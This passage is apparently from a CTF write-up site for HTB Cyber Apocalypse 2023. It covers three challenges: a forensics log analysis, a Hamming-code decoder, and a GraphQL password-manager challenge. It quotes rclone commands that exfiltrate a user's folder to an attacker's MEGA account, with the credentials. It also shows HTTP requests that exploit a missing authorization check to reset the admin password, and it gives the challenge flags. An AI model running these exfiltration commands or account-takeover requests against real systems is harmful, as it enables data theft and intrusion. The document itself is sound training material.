    \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 \u2023 Rclone Execution via     \u2502 1     \u2502 Microsoft-Windows-Sysmon \u2502 1        \u2502 76        \u2502 ---                            \u2502\n\u2502 Command Line or PowerShell \u2502       \u2502                          \u2502          \u2502           \u2502 CommandLine: \"\\\"C:\\\\Users\\\\wad \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 e\\\\AppData\\\\Local\\\\Temp\\\\rclon \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 e-v1.61.1-windows-amd64\\\\rclon \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 e.exe\\\" config create remote m \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 ega user majmeret@protonmail.c \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 om pass FBMeavdiaFZbWzpMqIVhJC \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 GXZ5XXZI1qsU3EjhoKQw0rEoQqHyI\" \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 Company: \"https://rclone.org\"  \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 CurrentDirectory: \"C:\\\\Users\\\\ \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 wade\\\\AppData\\\\Local\\\\Temp\\\\rc \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 lone-v1.61.1-windows-amd64\\\\\"  \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 Description: Rsync for cloud s \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 torage                         \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 FileVersion: 1.61.1            \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 Hashes: SHA256=E94901809FF7CC5 \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 168C1E857D4AC9CBB339CA1F6E21DC \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 CE95DFB8E28DF799961            \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 Image: \"C:\\\\Users\\\\wade\\\\AppDa \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 ta\\\\Local\\\\Temp\\\\rclone-v1.61. \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 1-windows-amd64\\\\rclone.exe\"   \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 IntegrityLevel: Medium         \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 LogonGuid: 10DA3E43-D892-63F8- \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 4B6D-030000000000              \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 LogonId: \"0x36d4b\"             \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 OriginalFileName: rclone.exe   \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 ParentCommandLine: \"\\\"C:\\\\Wind \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 ows\\\\System32\\\\WindowsPowerShe \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 ll\\\\v1.0\\\\powershell.exe\\\" \"   \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 ParentImage: \"C:\\\\Windows\\\\Sys \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 tem32\\\\WindowsPowerShell\\\\v1.0 \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 \\\\powershell.exe\"              \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 ParentProcessGuid: 10DA3E43-D8 \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 D2-63F8-9B00-000000000900      \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 ParentProcessId: 5888          \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 ParentUser: \"DESKTOP-UTDHED2\\\\ \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 wade\"                          \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 ProcessGuid: 10DA3E43-D92B-63F \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 8-B100-000000000900            \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 ProcessId: 3820                \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 Product: Rclone                \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 RuleName: \"-\"                  \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 TerminalSessionId: 1           \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 User: \"DESKTOP-UTDHED2\\\\wade\"  \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 UtcTime: \"2023-02-24 15:35:07. \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 336\"                           \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 \u2023 Rclone Execution via     \u2502 1     \u2502 Microsoft-Windows-Sysmon \u2502 1        \u2502 78        \u2502 ---                            \u2502\n\u2502 Command Line or PowerShell \u2502       \u2502                          \u2502          \u2502           \u2502 CommandLine: \"\\\"C:\\\\Users\\\\wad \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 e\\\\AppData\\\\Local\\\\Temp\\\\rclon \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 e-v1.61.1-windows-amd64\\\\rclon \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 e.exe\\\" copy C:\\\\Users\\\\Wade\\\\ \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 Desktop\\\\Relic_location\\\\ remo \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 te:exfiltration -v\"            \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 Company: \"https://rclone.org\"  \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 CurrentDirectory: \"C:\\\\Users\\\\ \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 wade\\\\AppData\\\\Local\\\\Temp\\\\rc \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 lone-v1.61.1-windows-amd64\\\\\"  \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 Description: Rsync for cloud s \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 torage                         \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 FileVersion: 1.61.1            \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 Hashes: SHA256=E94901809FF7CC5 \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 168C1E857D4AC9CBB339CA1F6E21DC \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 CE95DFB8E28DF799961            \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 Image: \"C:\\\\Users\\\\wade\\\\AppDa \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 ta\\\\Local\\\\Temp\\\\rclone-v1.61. \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 1-windows-amd64\\\\rclone.exe\"   \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 IntegrityLevel: Medium         \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 LogonGuid: 10DA3E43-D892-63F8- \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 4B6D-030000000000              \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 LogonId: \"0x36d4b\"             \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 OriginalFileName: rclone.exe   \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 ParentCommandLine: \"\\\"C:\\\\Wind \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 ows\\\\System32\\\\WindowsPowerShe \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 ll\\\\v1.0\\\\powershell.exe\\\" \"   \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 ParentImage: \"C:\\\\Windows\\\\Sys \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 tem32\\\\WindowsPowerShell\\\\v1.0 \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 \\\\powershell.exe\"              \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 ParentProcessGuid: 10DA3E43-D8 \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 D2-63F8-9B00-000000000900      \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 ParentProcessId: 5888          \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 ParentUser: \"DESKTOP-UTDHED2\\\\ \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 wade\"                          \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 ProcessGuid: 10DA3E43-D935-63F \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 8-B200-000000000900            \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 ProcessId: 5116                \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 Product: Rclone                \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 RuleName: \"-\"                  \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 TerminalSessionId: 1           \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 User: \"DESKTOP-UTDHED2\\\\wade\"  \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 UtcTime: \"2023-02-24 15:35:17. \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 516\"                           \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>I deleted the <code>timestamp</code> and <code>Computer</code> column for smaller and brief output\\ So here we have the output and executed commands we want</p> <p>These are the commands executed for data <code>exfiltiration</code> with rclone</p> <pre><code>rclone config create remote mega user majmeret@protonmail.com pass FBMeavdiaFZbWzpMqIVhJCGXZ5XXZI1qsU3EjhoKQw0rEoQqHyI\nrclone copy C:\\\\Users\\\\Wade\\\\Desktop\\\\Relic_location\\\\ remote:exfiltration -v\n</code></pre> <p>According to challenge description let's launch instance and answer the questions to get the flag</p> <pre><code>What is the email of the attacker used for the exfiltration process? (for example: name@email.com)\n&gt; majmeret@protonmail.com\n[+] Correct!\n\nWhat is the password of the attacker used for the exfiltration process? (for example: password123)\n&gt; FBMeavdiaFZbWzpMqIVhJCGXZ5XXZI1qsU3EjhoKQw0rEoQqHyI\n[+] Correct!\n\nWhat is the Cloud storage provider used by the attacker? (for example: cloud)\n&gt; mega\n[+] Correct!\n\nWhat is the ID of the process used by the attackers to configure their tool? (for example: 1337)\n&gt; 3820\n[+] Correct!\n\nWhat is the name of the folder the attacker exfiltrated; provide the full path. (for example: C:\\Users\\user\\folder)\n&gt; C:\\Users\\Wade\\Desktop\\Relic_location \n[+] Correct!\n\nWhat is the name of the folder the attacker exfiltrated the files to? (for example: exfil_folder)\n&gt; exfiltration\n[+] Correct!\n\n[+] Here is the flag: HTB{3v3n_3xtr4t3rr3str14l_B31nGs_us3_Rcl0n3_n0w4d4ys}\n</code></pre> <p>And here is the flag</p> <pre><code>HTB{3v3n_3xtr4t3rr3str14l_B31nGs_us3_Rcl0n3_n0w4d4ys}\n</code></pre>"},{"location":"2023/cyber-apocalypse-2023/hardware/hm74/","title":"1 - Challenge code and description","text":"<pre><code>As you venture further into the depths of the tomb, your communication with your team becomes increasingly disrupted by noise.\nDespite their attempts to encode the data packets, the errors persist and prove to be a formidable obstacle.\nFortunately, you have the exact Verilog module used in both ends of the communication.\nWill you be able to discover a solution to overcome the communication disruptions and proceed with your mission?\n</code></pre> <pre><code>module encoder(\n    input [3:0] data_in,\n    output [6:0] ham_out\n    );\n\n    wire p0, p1, p2;\n\n    assign p0 = data_in[3] ^ data_in[2] ^ data_in[0];\n    assign p1 = data_in[3] ^ data_in[1] ^ data_in[0];\n    assign p2 = data_in[2] ^ data_in[1] ^ data_in[0];\n\n    assign ham_out = {p0, p1, data_in[3], p2, data_in[2], data_in[1], data_in[0]};\nendmodule\n\nmodule main;\n    wire[3:0] data_in = 5;\n    wire[6:0] ham_out;\n\n    encoder en(data_in, ham_out);\n\n    initial begin\n        #10;\n        $display(\"%b\", ham_out);\n    end\nendmodule\n</code></pre> <p>Here we have a verilog code which splits input data into <code>4 bit arrays</code> and generate a parity checksum for them with <code>encoder</code> (p0,p1,p2)\\ So in output data we have <code>4 bit input data</code> and parity check <code>p0,p1,p2</code> which is for error detection\\ According to the challenge description this data is transfer and there are a lot of noice on it.</p>"},{"location":"2023/cyber-apocalypse-2023/hardware/hm74/#2-solution","title":"2 - Solution","text":"<p>To solve this lab we should use that parity check bits to ensure if the data was changed or got any noice or not.\\ Overall solution is like below:</p> <ol> <li>Capture raw binary data</li> <li>Split it into <code>7 bit</code> pieces</li> <li>generate a python dictionary foreach block with default value of <code>False</code> for each block which indicates we determine all blocks to got errored</li> <li>Check parity for each <code>7 bit</code> block with chech_parity function and if it is true update it in dictionary with the value <code>True</code></li> <li>Because each captured data has random noices, Repeat these steps and update each <code>7 bit block</code> if it has True parity_check until all blocks have True parity check</li> <li>get <code>4 bit</code> raw data from <code>7 bit</code> blocks concat to gether and decode it from binary to ascii</li> </ol> <p>Here is the overall process in python <pre><code>import socket\n\nHOST = '167.172.50.208'\nPORT = 30920\n\ndef parse(data):\n    return data[2] + data[4] + data[5] + data[6]\n\n\ndef check_parity(data_in):\n\n    enc = [int(i) for i in data_in]\n\n    p0 = enc[2] ^ enc[4] ^ enc[6]\n    p1 = enc[2] ^ enc[5] ^ enc[6]\n    p2 = enc[4] ^ enc[5] ^ enc[6]\n\n    return (p0 == enc[0] and p1 == enc[1] and p2 == enc[3])\n\n\ndef check_result(data):\n    for d in data:\n        if not data[d]:\n            return False\n\n    return True\n\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.connect((HOST, PORT))\nresults = []\nresult = {}\nfor i in range(0, 952, 7):\n    result[i] = ''\nraw = ''\n\nwhile True:\n    raw_enc = sock.recv(2048).decode().strip()[10:]\n\n    size = len(raw_enc)\n    encs = [raw_enc[i:i+7] for i in range(0, size, 7)]\n\n    index = 0\n    for raw_enc in encs:\n        if check_parity(raw_enc):\n            result[index] = raw_enc\n        index += 7\n\n    if check_result(result):\n        raw = ''.join([result[d] for d in result])\n        break\n\n\nindex = 0\nmessage = ''\nsize = len(raw)\n\nfor i in range(0, size, 7):\n    message += parse(raw[i:i+7])\n    index += 1\n\nflag = bytes.fromhex(hex(int(message,2))[2:])\nprint(flag)\n</code></pre></p> <p>If we run the code we get a flag but it is still noised the reason is that this custom parity check is not 100% true for error detection <pre><code>python solve.py\nb'HTB{hcm_w?thWs0m3\\x1fo.a\\x11ys15_y\\x10u_c4n_3\\xf87ract_\\x07hs_h4mmIn9_7_t_3&gt;\\xe3_fl49y'\n</code></pre></p> <p>So we should repeat executing it an getting errored flags and manually fix noised characters\\ Here are 10 output each one gives us different data <pre><code>HTB{hmm_w1th_s0m3_ana1ys15_y0u_c4n_3x7ract_7h3_h4mmin9_7_4_3nc_fl49}\nHTB{hmo_y1\u00e4h_s0m;_ana1ys15_y\u00d0u_C4n_3q7rac\u0094_7l\u00b3_\u00e80mm)n;_7[4_;nc_fl4yt\nHTF{hmm\u00bfw1ta_s0m3\u00cfanB1's1u_y0u\u00bf\u00f34n_cx7rdct_7h3_h4mmkk9_7_:_snc_fl49t\nHTB{h\u00fdm_w1th_s0m3_an\u00f4\u0001ys15_y0u_#4n_3x\u0017\u00e2act_7h3_h4mmi\u008e9_7_4_3nf_fl49s\nHTB\u007fhhm_t1th_s0\u00fd3_ana1ws15_ypu_#\u00b4n[6x\u00d7r\u0081ct_7h3[h\u0004mmgn9_7_4_3nc_fl:7}\nHTB\u007fhmm_w1th_s0m3_ala1}#15\u000fy0u_c4n_6x7rac$_\u00a9H6_l4emin:_\u00a7_4_3nc_fl4y\u00fd\nHtBr(=m_^1th_s0m3_hna1ys15]y0u_c\u0014n_3x7ra\u00f3}_7f3]h4mnin\u00b9\u001fg_4_3^c_fl49}\nHTAyh=m_w1t\u00f8aq0m_!na1ys\u00115_y0u_c4n_3x\u00d7rac\u0094_7h3_h4omin9\\\u0017_4_3nj_fl49}\nxTB{hmm_w1Dh\u00bf30m3_ana1\u00e9p15_y0u_c\u0004n_3x7ract_5h=_h:mmin9_7\u001f4_3\u00fej\u00dffl\u00a49}\nH\u0014B{h\u00e3m_'1th_\u00e30m3_aga1ys15\\y0u_\u00836n_3x7racD_\u00d7m3_h4cmin9\u00df7_4_3kc_fl49}\n</code></pre></p> <p>We can manually extract correct flag characters based on words meanings\\ And here is the final correct flag <pre><code>HTB{hmm_w1th_s0m3_ana1ys15_y0u_c4n_3x7ract_7h3_h4mmin9_7_4_3nc_fl49}\n</code></pre></p>"},{"location":"2023/cyber-apocalypse-2023/web/passman/","title":"1 - Challenge code and Descripton","text":"<pre><code>Pandora discovered the presence of a mole within the ministry.\nTo proceed with caution, she must obtain the master control password for the ministry, which is stored in a password manager.\nCan you hack into the password manager?\n</code></pre> <p>We ae given the project files including backeng js, dockerfile, database queries and ...</p> <ol> <li>First of all this is DB tables</li> </ol> <p><pre><code>CREATE DATABASE passman;\n\nCREATE TABLE passman.users (\n    id          INT NOT NULL AUTO_INCREMENT,\n    username    VARCHAR(256) UNIQUE NOT NULL,\n    password    VARCHAR(256) NOT NULL,\n    email       VARCHAR(256) UNIQUE NOT NULL,\n    is_admin    INT NOT NULL DEFAULT 0,\n    PRIMARY KEY (id)\n);\n\nINSERT INTO passman.users (username, password, email, is_admin)\nVALUES\n    ('admin', '$(genPass)', 'admin@passman.htb', 1),\n    ('louisbarnett', '$(genPass)', 'louis_p_barnett@mailinator.com', 0),\n    ('ninaviola', '$(genPass)', 'ninaviola57331@mailinator.com', 0),\n    ('alvinfisher', '$(genPass)', 'alvinfisher1979@mailinator.com', 0);\n\n\nCREATE TABLE IF NOT EXISTS passman.saved_passwords (\n    id         INT NOT NULL AUTO_INCREMENT,\n    owner      VARCHAR(256) NOT NULL,\n    type       VARCHAR(256) NOT NULL,\n    address    VARCHAR(256) NOT NULL,\n    username   VARCHAR(256) NOT NULL,\n    password   VARCHAR(256) NOT NULL,\n    note       VARCHAR(256) NOT NULL,\n    PRIMARY KEY (id)\n);\n\nINSERT INTO passman.saved_passwords (owner, type, address, username, password, note)\nVALUES\n    ('admin', 'Web', 'igms.htb', 'admin', 'HTB{f4k3_fl4g_f0r_t3st1ng}', 'password'),\n    ('louisbarnett', 'Web', 'spotify.com', 'louisbarnett', 'YMgC41@)pT+BV', 'student sub'),\n    ('louisbarnett', 'Email', 'dmail.com', 'louisbarnett@dmail.com', 'L-~I6pOy42MYY#y', 'private mail'),\n    ('ninaviola', 'Web', 'office365.com', 'ninaviola1', 'OfficeSpace##1', 'company email'),\n    ('alvinfisher', 'App', 'Netflix', 'alvinfisher1979', 'efQKL2pJAWDM46L7', 'Family Netflix'),\n    ('alvinfisher', 'Web', 'twitter.com', 'alvinfisher1979', '7wYz9pbbaH3S64LG', 'old twitter account');\n\nGRANT ALL ON passman.* TO 'passman'@'%' IDENTIFIED BY 'passman' WITH GRANT OPTION;\nFLUSH PRIVILEGES;\n</code></pre> If we look closer we see that the flag is inside <code>saved_passwords</code> table which is for admin user</p> <ol> <li>We also have graphql in backend which do login,register,save password, ...</li> </ol> <p>Here is register request</p> <pre><code>POST /graphql HTTP/1.1\nHost: 138.68.162.218:32084\nContent-Length: 237\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36\nContent-Type: application/json\nAccept: */*\nOrigin: http://138.68.162.218:32084\nReferer: http://138.68.162.218:32084/register\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9,fa;q=0.8\nConnection: close\n\n{\n  \"query\": \"mutation($email: String!, $username: String!, $password: String!) { RegisterUser(email: $email, username: $username, password: $password) { message } }\",\n  \"variables\": {\n    \"email\": \"test@test.com\",\n    \"username\": \"0x17\",\n    \"password\": \"1234\"\n  }\n}\n</code></pre> <p>And here is the backed graphql section for registration which is <code>Graphql Mutation</code></p> <pre><code>name: 'Mutation',\nfields: {\n    RegisterUser: {\n        type: ResponseType,\n        args: {\n            email: { type: new GraphQLNonNull(GraphQLString) },\n            username: { type: new GraphQLNonNull(GraphQLString) },\n            password: { type: new GraphQLNonNull(GraphQLString) }\n        },\n        resolve: async (root, args, request) =&gt; {\n            return new Promise((resolve, reject) =&gt; {\n                db.registerUser(args.email, args.username, args.password)\n                    .then(() =&gt; resolve(response(\"User registered successfully!\")))\n                    .catch(err =&gt; reject(new GraphQLError(err)));\n            });\n        }\n    },\n</code></pre> <p>Here is login request</p> <pre><code>POST /graphql HTTP/1.1\nHost: 138.68.162.218:32084\nContent-Length: 185\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36\nContent-Type: application/json\nAccept: */*\nOrigin: http://138.68.162.218:32084\nReferer: http://138.68.162.218:32084/\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9,fa;q=0.8\nConnection: close\n\n{\n  \"query\": \"mutation($username: String!, $password: String!) { LoginUser(username: $username, password: $password) { message, token } }\",\n  \"variables\": {\n    \"username\": \"0x17\",\n    \"password\": \"1234\"\n  }\n}\n</code></pre> <p>And here is the backend graphql code which is also a <code>Graphql Mutation</code></p> <pre><code>LoginUser: {\n    type: ResponseType,\n    args: {\n        username: { type: new GraphQLNonNull(GraphQLString) },\n        password: { type: new GraphQLNonNull(GraphQLString) }\n    },\n    resolve: async (root, args, request) =&gt; {\n        return new Promise((resolve, reject) =&gt; {\n            db.loginUser(args.username, args.password)\n                .then(async (user) =&gt; {\n                    if (user.length) {\n                        let token = await JWTHelper.sign( user[0] );\n                        resolve({\n                            message: \"User logged in successfully!\",\n                            token: token\n                        });\n                    };\n                    reject(new Error(\"Username or password is invalid!\"));\n                })\n                .catch(err =&gt; reject(new GraphQLError(err)));\n        });\n    }\n},\n</code></pre> <p>After logging in a JWT is assigned to us which indicates our user.\\ Our goal is to get flag which is inside saved_passwords database inside admin notes\\ Each user can see his/her only notes not others according to this code which is a <code>Graphql Query</code></p> <pre><code>name: 'Query',\nfields: {\n    getPhraseList: {\n        type: new GraphQLList(PhraseSchema),\n        resolve: async (root, args, request) =&gt; {\n            return new Promise((resolve, reject) =&gt; {\n                if (!request.user) return reject(new GraphQLError('Authentication required!'));\n\n                db.getPhraseList(request.user.username)\n                    .then(rows =&gt; resolve(rows))\n                    .catch(err =&gt; reject(new GraphQLError(err)))\n            });\n        }\n    }\n}\n</code></pre> <p>So we as a non-admin user can not see admin<code>s notes which is flag\\ There are also two other</code>Graphql Mutations`</p> <p>AddPhrase : which is for adding note</p> <pre><code>AddPhrase: {\n    type: ResponseType,\n    args: {\n        recType: { type: new GraphQLNonNull(GraphQLString) },\n        recAddr: { type: new GraphQLNonNull(GraphQLString) },\n        recUser: { type: new GraphQLNonNull(GraphQLString) },\n        recPass: { type: new GraphQLNonNull(GraphQLString) },\n        recNote: { type: new GraphQLNonNull(GraphQLString) },\n    },\n    resolve: async (root, args, request) =&gt; {\n        return new Promise((resolve, reject) =&gt; {\n            if (!request.user) return reject(new GraphQLError('Authentication required!'));\n\n            db.addPhrase(request.user.username, args)\n                .then(() =&gt; resolve(response(\"Phrase added successfully!\")))\n                .catch(err =&gt; reject(new GraphQLError(err)));\n        });\n    }\n  },\n</code></pre> <p>UpdatePassword: which is for changing password for a user</p> <pre><code>UpdatePassword: {\n    type: ResponseType,\n    args: {\n        username: { type: new GraphQLNonNull(GraphQLString) },\n        password: { type: new GraphQLNonNull(GraphQLString) }\n    },\n    resolve: async (root, args, request) =&gt; {\n        return new Promise((resolve, reject) =&gt; {\n            if (!request.user) return reject(new GraphQLError('Authentication required!'));\n\n            db.updatePassword(args.username, args.password)\n                .then(() =&gt; resolve(response(\"Password updated successfully!\")))\n                .catch(err =&gt; reject(new GraphQLError(err)));\n        });\n    }\n},\n</code></pre> <p>The <code>UpdatePassword</code> Mutation looks interesting and as we can see there is no proper authentication to prevent nonadmin users to change other users' password\\ Let's look at the <code>UpdatePassword Mutation</code> schema through graphql introspection query</p> <pre><code>POST /graphql HTTP/1.1\nHost: 138.68.162.218:32084\nContent-Length: 106\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36\nContent-Type: application/json\nAccept: */*\nOrigin: http://138.68.162.218:32084\nReferer: http://138.68.162.218:32084/\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9,fa;q=0.8\nConnection: close\n\n{\n  \"query\": \"{__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind}}}}}}}\"\n}\n</code></pre> <p>And here is the <code>UpdatePassword</code> Mutation</p> <pre><code>{\n  \"name\": \"UpdatePassword\",\n  \"args\": [\n    {\n      \"name\": \"username\",\n      \"description\": null,\n      \"type\": {\n        \"name\": null,\n        \"kind\": \"NON_NULL\",\n        \"ofType\": {\n          \"name\": \"String\",\n          \"kind\": \"SCALAR\"\n        }\n      }\n    },\n    {\n      \"name\": \"password\",\n      \"description\": null,\n      \"type\": {\n        \"name\": null,\n        \"kind\": \"NON_NULL\",\n        \"ofType\": {\n          \"name\": \"String\",\n          \"kind\": \"SCALAR\"\n        }\n      }\n    }\n  ]\n}\n</code></pre> <p>We can see we need two parameters (username,password) which we can change every user's password without proper authorization.\\ Here is the graphql query for updating admin's password (I built it based on login mutation which is similar to UpdatePassword)</p> <pre><code>POST /graphql HTTP/1.1\nHost: 138.68.162.218:32084\nContent-Length: 191\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36\nContent-Type: application/json\nAccept: */*\nOrigin: http://138.68.162.218:32084\nReferer: http://138.68.162.218:32084/\nAccept-Encoding: gzip, deflate\nAccept-Language: 